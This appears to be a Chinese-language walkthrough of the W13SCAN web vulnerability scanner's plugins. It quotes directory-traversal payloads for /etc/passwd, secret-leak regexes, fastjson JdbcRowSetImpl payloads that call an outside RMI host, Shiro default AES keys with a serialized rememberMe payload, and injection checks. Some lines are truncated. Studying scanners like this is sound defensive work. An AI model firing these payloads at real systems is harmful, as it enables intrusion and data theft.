        'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d', 
        'Non-authoritative\sanswer:\s+Name:\s*', 
        'Server:\s*.*?\nAddress:\s*' 
    ], 
    "echo `echo 6162983|base64`6162983".format(randint): [ 
        "NjE2Mjk4Mwo=6162983" 
    ] 
} 
判断是否成功直接就响应中匹配回显
在dnslog api中check函数里对 延迟进行了封装默认会延迟5s
directory_traversal 路径穿越插件
 W13SCAN/scanners/PerFile/directory_traversal.py 
生成目录穿越的payload
def generate_payloads(self): 
    payloads = [] 
    default_extension = ".jpg" 
    payloads.append("../../../../../../../../../../../etc/passwd%00") 
    payloads.append("/etc/passwd") 
    if OS.LINUX in self.response.os or OS.DARWIN in self.response.os or conf.level >= 4: 
        payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00"))) 
        payloads.append( 
            "../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension) 
    if OS.WINDOWS in self.response.os: 
        payloads.append("../../../../../../../../../../windows/win.ini") 
        payloads.append("C:\\boot.ini") 
        # if origin: 
        #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini") 
        payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts") 
    if WEB_PLATFORM.JAVA in self.response.programing: 
        payloads.append("/WEB-INF/web.xml") 
        payloads.append("../../WEB-INF/web.xml") 
    return payloads 
回显判断
js_sensitive_content js文件敏感内容匹配
这里只匹配url后缀是js的 
然后下面是正则payload
# in 判断 包含 
plainArray = [ 
    "; for 16-bit app support", 
    "[MCI Extensions.BAK]", 
    "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.", 
    "# localhost name resolution is handled within DNS itself.", 
    "[boot loader]" 
] 
# 正则判断   
regexArray = [ 
    '(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)', 
    '(root:\w:\d*:)', 
    "System\.IO\.FileNotFoundException: Could not find file\s'\w:", 
    "System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:", 
    "Warning:\s\sDOMDocument::load\(\)\s\[domdocument.load\]
    "()", 
    "Warning: fopen\(", 
    "open_basedir restriction in effect", 
    '/bin/(bash|sh)[^\r\n<>]*[\r\n]', 
    '\[boot loader\][^\r\n<>]*[\r\n]' 
] 
regx = { 
    # 匹配url 
    # r'(\b|\'|")(?:http:|https:)(?:[\w/\.]+)?(?:[a-zA-Z0-9_\-\.]{1,})\.(?:php|asp|ashx|jspx|aspx|jsp
    # 匹配邮箱 
    "邮箱信息": r'[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(?:\.[a-zA-Z0-9_-]+)+', 
    # 匹配token或者密码泄露 
    # 例如token = xxxxxxxx, 或者"apikey" : "xssss" 
    "Token或密码": r'\b(?:secret|secret_key|token|secret_token|auth_token|access_token|username|passwo
    # 匹配IP地址 
    "IP地址": r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0
    # 匹配云泄露 
    "Cloudfront云泄露": r'[\w]+\.cloudfront\.net', 
    "Appspot云泄露": r'[\w\-.]+\.appspot\.com', 
    "亚马逊云泄露": r'[\w\-.]*s3[\w\-.]*\.?amazonaws\.com\/?[\w\-.]*', 
    "Digitalocean云泄露": r'([\w\-.]*\.?digitaloceanspaces\.com\/?[\w\-.]*)', 
    "Google云泄露": r'(storage\.cloud\.google\.com\/[\w\-.]+)', 
    "Google存储API泄露": r'([\w\-.]*\.?storage.googleapis.com\/?[\w\-.]*)', 
    # 匹配手机号 
    "手机号": r'(?:139|138|137|136|135|134|147|150|151|152|157|158|159|178|182|183|184|187|188|198|130
    # 匹配域名 
    # "域名泄露": r'((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+(?:biz|cc|club|cn|com|co|edu
    # SSH 密钥 
    "SSH密钥": '([-]+BEGIN [^\\s]+ PRIVATE KEY[-]+[\\s]*[^-]*[-]+END [^\\s]+ ' 
                'PRIVATE KEY[-]+)', 
    # access_key 
    "Access Key": 'access_key.*?["\'](.*?)["\']', 
    "Access Key ID 1": 'accesskeyid.*?["\'](.*?)["\']', 
    "Access Key ID 2": 'accesskeyid.*?["\'](.*?)["\']', 
    # 亚马逊 aws api 账号 密钥 
    "亚马逊AWS API": 'AKIA[0-9A-Z]{16}', 
    "亚马逊AWS 3S API 1": 's3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com', 
    "亚马逊AWS 3S API 2": '([a-zA-Z0-9-\\.\\_]+\\.s3\\.amazonaws\\.com|s3://[a-zA-Z0-9-\\.\\_]+|s3-[a-
    "亚马逊AWS 3S API 3": 'amzn\\\\.mws\\\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{1
    # author 信息 
    "作者信息": '@author[: ]+(.*?) ', 
    "API": 'api[key|_key|\\s+]+[a-zA-Z0-9_\\-]{5,100}', 
    "基础信息": 'basic [a-zA-Z0-9=:_\\+\\/-]{5,100}', 
    "Bearer": 'bearer [a-zA-Z0-9_\\-\\.=:_\\+\\/]{5,100}', 
    # facebook token 
    "Facebook Token": 'EAACEdEose0cBA[0-9A-Za-z]+', 
    # github token 
    "Github Token": '[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\-]+@github\\.com*', 
    # google api 
    "Google API": 'AIza[0-9A-Za-z-_]{35}', 
    # google captcha 验证 
    "Google验证码": '6L[0-9A-Za-z-_]{38}|^6[0-9a-zA-Z_-]{39}$', 
    # google oauth 权限 
    "Google OAuth": 'ya29\\.[0-9A-Za-z\\-_]+', 
jsonp JSONP寻找插件
这里是使用正则匹配的方式去判断的
如果参数中有  ["callback", "cb", "json"] 才继续进行 
这个参数是说json里的 data里的params里的
匹配是分正则和in两种 
正则
    # jwt 
    "JWT鉴权": 'ey[A-Za-z0-9-_=]+\\.[A-Za-z0-9-_=]+\\.?[A-Za-z0-9-_.+/=]*$', 
    # mailgun 服务密钥 
    "Mailgun服务密钥": 'key-[0-9a-zA-Z]{32}', 
    # paypal braintree 访问凭证 
    "Paypal/Braintree访问凭证": 'access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}', 
    # PGP 密钥块 
    "PGP密钥": '-----BEGIN PGP PRIVATE KEY BLOCK-----', 
    # possible_creds 
    "密码泄露": '(?i)(password\\s*[`=:\\"]+\\s*[^\\s]+|password ' 
            'is\\s*[`=:\\"]*\\s*[^\\s]+|pwd\\s*[`=:\\"]*\\s*[^\\s]+|passwd\\s*[`=:\\"]+\\s*[^\\s]+)',
    # RSA 
    "RSA密钥": '-----BEGIN EC PRIVATE KEY-----', 
    # DSA 
    "DSA密钥": '-----BEGIN DSA PRIVATE KEY-----', 
    # stripe 账号泄露 
    "Stripe账号泄露 1": 'rk_live_[0-9a-zA-Z]{24}', 
    "Stripe账号泄露 2": 'sk_live_[0-9a-zA-Z]{24}', 
    # twillio 账号泄露 
    "Twillio 账号泄露 1": 'AC[a-zA-Z0-9_\\-]{32}', 
    "Twillio 账号泄露 2": 'SK[0-9a-fA-F]{32}', 
    "Twillio 账号泄露 3": 'AP[a-zA-Z0-9_\\-]{32}' 
} 
in的话
def sensitive_bankcard(source): 
    _ = r'\D(6\d{14,18})\D' 
    texts = re.findall(_, source, re.M | re.I) 
    out = [] 
    if texts: 
        for i in set(texts): 
            out.append({ 
                "type": "bankcard", 
                "content": i 
            }) 
    return out 
def sensitive_idcard(source): 
    _ = r'\D([123456789]\d{5}((19)|(20))\d{2}((0[123456789])|(1[012]))((0[123456789])|([12][0-9])|(3[
    texts = re.findall(_, source, re.M | re.I) 
    out = [] 
    if texts: 
        for i in set(texts): 
            if len(i[0]) < 18: 
                continue 
            out.append({ 
                "type": "idycard", 
                "content": i[0] 
            }) 
    return out 
def sensitive_phone(source): 
    _ = r'\D(1[3578]\d{9})\D' 
    texts = re.findall(_, source, re.M | re.I) 
    out = [] 
    if texts: 
        for i in set(texts): 
            out.append({ 
                "type": "phone", 
                "content": i 
            }) 
    return out 
def sensitive_email(source): 
    _ = r'(([a-zA-Z0-9]+[_|\-|\.]?)*[a-zA-Z0-9]+\@([a-zA-Z0-9]+[_|\-|\.]?)*[a-zA-Z0-9]+(\.[a-zA-Z]{2,
    texts = re.findall(_, source, re.M | re.I) 
    if texts: 
        for i in set(texts): 
            return { 
                "type": "email", 
                "content": i[0] 
            } 
匹配上的话在修改下referer 看是否可以继续访问获取信息可以的话认为漏洞存在
headers["Referer"] = fake_domain 
req = requests.get(self.requests.url, headers=headers) 
result2 = self.check_sentive_content(req.text) 
if not result2:
    return 
php_real_path 信息泄露
根据desc说明 对于一些php网站，将正常参数替换为[]可能造成真实信息泄漏
所以先判断是否是php的 是的话 对所有参数的key换成k+[]的形式 
再次发起请求 并且判断  "Warning" "array given in  是否存在响应页面中
参数增加[]
for k, v in iterdata.items(): 
    data = copy.deepcopy(iterdata) 
    del data[k] 
    key = k + "[]" 
    data[key] = v 
poc_fastjson 打fastjson的
如果是json的或者类似json的post请求的 
 if self.requests.post_hint == POST_HINT.JSON or self.requests.post_hint == POST_HINT.JSON_LIKE: 
创建一个反连平台api实例然后生成token 域名 传入payload生成函数 
发起请求 测试dnslog是否存在
反连平台api
rmi = reverseApi() 
if rmi.isUseReverse(): 
    rmidomain = rmi.generate_rmi_token() 
    rmi_token = rmidomain["token"] 
    fullname = rmidomain["fullname"] 
1.2.24的payload
sensitive_list = ['username', 'memberid', 'nickname', 'loginid', 'mobilephone', 'userid', 'passportid
                    'profile', 'loginname', 'loginid', 
                    'email', 'realname', 'birthday', 'sex', 'ip'] 
# for fastjson 1.2.24 
fastjson_payload = { 
    random_str(4): { 
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "rmi://{}".format(domain), 
        "autoCommit": True 
    } 
} 
1.2.47的payload
# for fastjson 1.2.47 
fastjson_payload = { 
    random_str(4): { 
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl" 
    }, 
    random_str(4): { 
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "rmi://{}".format(domain), 
        "autoCommit": True 
    } 
} 
shiro Shiro框架检测以及Key爆破
先判断是否是 Shiro 直接从响应中判断
if "deleteMe" in respHeader.get('Set-Cookie', ''): 
    isShiro = True 
是的话先产生一条漏洞
如果响应中没有 在cookie里加下  _cookie["rememberMe"] = "2" 
然后发请求 如果在响应头中看的  deleteMe  则说明是Shiro
if req and "deleteMe" in req.headers.get('Set-Cookie', ''): 
    isShiro = True 
这里如果是Shiro还会爆破下key 
默认的key
def _check_key(self): 
keys = [ 
    'kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'WkhBTkdYSUFPSEVJX0NBVA==', 
    'RVZBTk5JR0hUTFlfV0FPVQ==', 'U3ByaW5nQmxhZGUAAAAAAA==',
    'cGljYXMAAAAAAAAAAAAAAA==', 'd2ViUmVtZW1iZXJNZUtleQ==', 'fsHspZw/92PrS3XrPW+vxw==', 
    'sHdIjUN6tzhl8xZMG3ULCQ==', 'WuB+y2gcHRnY2Lg9+Aqmqg==',
    'ertVhmFLUs0KTA3Kprsdag==', '2itfW92XazYRi5ltW0M2yA==', '6ZmI6I2j3Y+R1aSn5BOlAA==', 
    'f/SY5TIve5WWzT4aQlABJA==', 'Jt3C93kMR9D5e8QzwfsiMw==',
    'aU1pcmFjbGVpTWlyYWNsZQ==', 
] 
生成payload
然后将payload写到Cookie的 rememberMe中 发起请求
_cookie = paramToDict(reqHeader["Cookie"], place=PLACE.COOKIE) 
_cookie["rememberMe"] = payload 
reqHeader["Cookie"] = url_dict2str(_cookie, PLACE.COOKIE) 
最后判断  "deleteMe" not in req.headers.get('Set-Cookie', '')  
则存在反序列化漏洞
sqli_bool 布尔注入检测
先直接请求一次 然后去除多余数据后匹配相似度
def generator_payload(self, key): 
    payload = b'\xac\xed\x00\x05sr\x002org.apache.shiro.subject.SimplePrincipalCollection\xa8\x7fX%\x
    iv = b'w\xcf\xd7\x98\xa8\xe9LD\x97LN\xd0\xa6\n\xb8\x1a'
    backend = default_backend() 
    cipher = Cipher(algorithms.AES(base64.b64decode(key)), modes.CBC(iv), backend=backend) 
    encryptor = cipher.encryptor() 
    BS = algorithms.AES.block_size 
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() 
    file_body = pad(payload) 
    ct = encryptor.update(file_body) 
    base64_ciphertext = base64.b64encode(iv + ct) 
    return base64_ciphertext.decode() 
if self.requests.method == HTTPMETHOD.POST: 
    r = requests.post(self.requests.url, data=self.requests.data, headers=self.requests.headers) 
else: 
    r = requests.get(self.requests.url, headers=self.requests.headers) 
html = self.removeDynamicContent(r.text) 
self.resp_str = self.removeDynamicContent(self.resp_str) 
try: 
    self.seqMatcher.set_seq1(self.resp_str) 
    self.seqMatcher.set_seq2(html) 
    ratio = round(self.seqMatcher.quick_ratio(), 3) 
并且查找动态内容
计数+1
self.findDynamicContent(self.resp_str, html) 